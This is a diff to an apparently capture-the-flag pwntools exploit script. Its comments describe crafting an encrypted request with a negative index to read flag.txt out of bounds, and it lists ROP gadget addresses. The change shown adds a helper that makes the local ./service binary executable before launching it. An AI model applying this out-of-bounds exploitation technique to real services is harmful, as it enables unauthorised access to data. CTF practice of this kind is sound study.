@@ -5,9 +5,17 @@
 # leak key, then hand-craft an encrypted RELAY op=3 (fetch) request with a NEGATIVE
 # index (-4): notes-table@0x4060b0 minus 4*0x40c == system-table[0]@0x405080 == flag.txt
 # (type 2 -> pread). Send it raw to the vault over fd3, then RELAY reads+decrypts+prints.
-import sys, time
+import sys, os, stat, time
 from pwn import *
 context.arch = 'amd64'; context.log_level = 'info'
+
+def local_io():
+    # make ./service executable if it isn't already
+    try:
+        os.chmod('./service', os.stat('./service').st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
+    except OSError as e:
+        log.warning('chmod ./service failed: %s' % e)
+    return process('./service')
 
 pop_rdi = 0x401529            # pop rdi ; ret
 pop_rsi = 0x401dd5            # pop rsi ; ret
@@ -59,7 +67,7 @@ def pwn(io):
 if __name__ == '__main__':
     d = None
     for attempt in range(20):
-        io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process('./service')
+        io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else local_io()
         try:
             d = pwn(io)
         except EOFError:
